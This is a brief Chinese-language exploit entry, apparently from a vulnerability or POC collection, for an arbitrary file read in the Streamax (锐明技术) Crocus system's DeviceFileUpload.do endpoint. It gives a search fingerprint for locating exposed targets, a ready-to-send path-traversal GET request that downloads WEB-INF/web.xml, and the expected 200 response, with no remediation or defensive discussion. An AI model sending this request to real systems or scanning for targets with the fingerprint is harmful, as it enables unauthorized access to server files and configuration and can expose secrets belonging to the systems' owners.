# 锐明技术Crocus系统DeviceFileUpload.do任意文件读取漏洞

锐明技术Crocus系统DeviceFileUpload.do ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/ThirdResource/respond/respond.min.js"`
- **请求**：`GET /DeviceFileUpload.do?Action=Download&&path=/../WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200